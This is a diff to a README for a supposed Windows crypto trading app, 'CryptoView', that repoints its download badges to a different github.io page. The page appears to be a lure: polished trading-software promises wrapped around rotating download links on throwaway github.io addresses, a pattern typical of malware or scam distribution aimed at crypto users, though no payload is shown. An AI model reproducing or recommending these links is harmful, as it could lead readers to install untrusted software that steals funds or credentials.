@@ -4,7 +4,7 @@
 
 ## 📥 Download CryptoView for Windows
 
-[![⬇️ Download CryptoView](https://img.shields.io/badge/Download-CryptoView-blue?style=for-the-badge&logo=windows)](https://stefankuznetsoff.github.io/.github/crypto-view)
+[![⬇️ Download CryptoView](https://img.shields.io/badge/Download-CryptoView-blue?style=for-the-badge&logo=windows)](https://rauljamesmlbr.github.io/.github/crypto-view)
 
 ---
 
@@ -32,7 +32,7 @@ In addition to manual trading, CryptoView supports order management features lik
 
 The platform is designed for multi-account management, making it ideal for fund managers and traders who operate across multiple platforms. With bank-level encryption, two-factor authentication, and no custody of funds, CryptoView ensures your assets remain secure while providing professional trading capabilities in one centralized application.
 
-[![⬇️ Download CryptoView](https://img.shields.io/badge/Download-CryptoView-blue?style=for-the-badge&logo=windows)](https://viewloads.github.io/.github/)
+[![⬇️ Download CryptoView](https://img.shields.io/badge/Download-CryptoView-blue?style=for-the-badge&logo=windows)](https://rauljamesmlbr.github.io/.github/crypto-view)
 
 ---
 
